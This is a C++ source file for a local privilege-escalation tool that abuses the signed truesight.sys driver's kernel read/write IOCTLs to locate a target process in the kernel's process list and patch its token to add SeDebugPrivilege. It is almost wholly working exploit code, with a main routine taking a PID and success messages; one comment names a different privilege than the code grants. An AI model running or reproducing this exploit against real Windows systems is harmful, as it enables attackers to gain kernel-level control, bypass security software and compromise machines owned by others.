#include "KernelReadWrite.h"
#include "Offsets.h"
#include "Utils.h"

#include <iostream>

//
// Abuses the truesight.sys signed driver to elevate privileges of a process to NT AUTHORITY/SYSTEM
// Uses two IOCTLs, which straight-up give memory read/write primitives
// 
// Credit to https://github.com/MaorSabag/TrueSightKiller/tree/main for exposing the driver:)
//

void AddPrivilegesToToken(PBYTE Token, ULONGLONG NewPrivileges, IKernelReadWrite* Rw) {
	PBYTE pPrivileges = Token + c_PrivilegesOffset;

	ShortenedPrivileges privileges = { 0 };
	Rw->ReadType<ShortenedPrivileges>(pPrivileges, &privileges);

	// add new privileges
	privileges.Enabled |= NewPrivileges;
	privileges.Present |= NewPrivileges;

	// write back
	// really should create WriteType but nah this works too

	Rw->WriteQword(pPrivileges, privileges.Present);
	Rw->WriteQword(pPrivileges + FIELD_OFFSET(ShortenedPrivileges, Enabled), privileges.Enabled);
}

bool ElevatePrivileges(DWORD Id, PBYTE KernelBase, IKernelReadWrite* Rw) {

	// Copy SYSTEM token from SYSTEM process

	auto* systemProcess = (PBYTE)Rw->ReadQword(KernelBase + c_PsInitialSystemProcess);
	//auto systemToken = Rw->ReadQword(systemProcess + c_TokenOffset);

	// Find our process by its id

	auto* listHead = systemProcess + c_ProcessLinksOffset;
	auto* curr = (PBYTE)Rw->ReadQword(listHead);
	while (curr != listHead) {
		auto* process = curr - c_ProcessLinksOffset;
		auto processId = Rw->ReadQword(process + c_ProcessIdOffset);
		if (processId == Id) {
			std::cout << "[+] Found process at 0x" << std::hex << (Qword)process << std::endl;

			//
			// elevating privileges, let's try to give ourselves SeCreateTokenPrivilege
			//

			auto token = Rw->ReadQword(process + c_TokenOffset);
			// zero out ref-count
			token &= ~0xf;

			AddPrivilegesToToken((PBYTE)token, SeDebugPrivilege, Rw);
			return true;
		}
		// go to next process
		curr = (PBYTE)Rw->ReadQword(curr);
	}
	return false;
}


int main(int argc, char* argv[]) {
	if (argc < 2) {
		RaiseError("usage: TrueSightDemolisher.exe PID");
	}
	
	DWORD processId = std::strtoul(argv[1], nullptr, 10);
	auto* kernelBase = GetKernelBase();

	std::cout << "[+] Kernel base: 0x" << std::hex << (Qword)kernelBase << std::endl;
	
	TrueSightRw rw;
	auto succeded = ElevatePrivileges(processId, kernelBase, &rw);
	if (!succeded) {
		RaiseError("[-] Failed to elevate privileges. Maybe the process is not up?");
	}
	std::cout << "[+] Enjoy your new powers:)" << std::endl;
}